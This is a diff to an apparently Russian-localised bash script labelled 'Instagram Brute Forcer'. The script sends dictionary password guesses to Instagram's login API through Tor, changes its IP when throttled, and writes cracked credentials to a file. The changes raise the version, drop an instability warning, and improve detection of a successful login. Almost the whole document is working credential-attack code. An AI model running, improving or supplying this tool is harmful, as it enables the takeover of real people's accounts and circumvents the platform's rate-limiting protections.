@@ -50,8 +50,8 @@ printf "\e[1;92m ) )| ||  _ \  /___)(_   _)(____ | /___)|  _ \ | ___ || || |    
 printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ ||___ || | | || ____|| || |  _____   \e[0m\n"
 printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|(___/ |_| |_||_____) \_)\_)(_____)  \e[0m\n"
 printf "\n"
-printf "\e[1;77m\e[45m  Instagram Brute Forcer v1.5.2 Author: thelinuxchoice (Github/IG)   \e[0m\n"
-printf "\e[1;77m\e[45m            RU by XI_shArky_IX (github.com/XIshArkIX)   \e[0m\n"
+printf "\e[1;77m\e[45m  Instagram Brute Forcer v1.5.3 Author: thelinuxchoice (Github/IG)   \e[0m\n"
+printf "\e[1;77m\e[45m            RU by XI_shArky_IX (github.com/XIshArkIX)                \e[0m\n"
 printf "\n"
 }
 
@@ -70,7 +70,7 @@ default_wl_pass="passwords.lst"
 read -p $'\e[1;92mСловарь (или Enter для использования стандартного): \e[0m' wl_pass
 wl_pass="${wl_pass:-${default_wl_pass}}"
 default_threads="10"
-read -p $'\033[41m\033[30mНЕСТАБИЛЬНО!!! Особенно при использовании ключа --resume\033[0m\n\e[1;92mПотоки (Используйте <20 или Enter, чтобы использовать 10): \e[0m' threads
+read -p $'\e[1;92mПотоки (Используйте <20 или Enter, чтобы использовать 10): \e[0m' threads
 threads="${threads:-${default_threads}}"
 fi
 }
@@ -146,7 +146,7 @@ useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xia
 let token++
 printf "\e[1;77mПробую (%s/%s)\e[0m: %s\n" $token $count_pass $pass
 
-{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; ru_RU)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Найден пароль: %s\n [*] Запрошено испытание\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Найден пароль: %s\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
+{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; ru_RU)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Найден пароль: %s\n [*] Запрошено испытание\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Найден пароль: %s\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
 
 let startline+=$threads
 let endline+=$threads
@@ -175,7 +175,7 @@ done
 read -p $'\e[1;92mВыберите номер сессии: \e[0m' fileresume
 source $(ls sessions/store.session* | sed ''$fileresume'q;d')
 default_threads=10
-read -p $'\033[41m\033[30mНЕСТАБИЛЬНО!!! Особенно при использовании ключа --resume\033[0m\n\e[1;92mПотоки (Используйте <20 или Enter, чтобы использовать 10): \e[0m' threads
+read -p $'\e[1;92mПотоки (Используйте <20 или Enter, чтобы использовать 10): \e[0m' threads
 threads="${threads:-${default_threads}}"
 
 printf "\e[1;92m[*] Продолжаю сессию для:\e[0m \e[1;77m%s\e[0m\n" $user
@@ -199,7 +199,7 @@ hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 printf "\e[1;77mПробую (%s/%s)\e[0m: %s\n" $token $count_pass $pass
 let token++
-{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; ru_RU)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Пароль найден: %s\n [*] Запрошено испытание\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Пароль найден: %s\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
+{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; ru_RU)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Найден пароль: %s\n [*] Запрошено испытание\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Найден пароль: %s\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
 
 changeip
 done
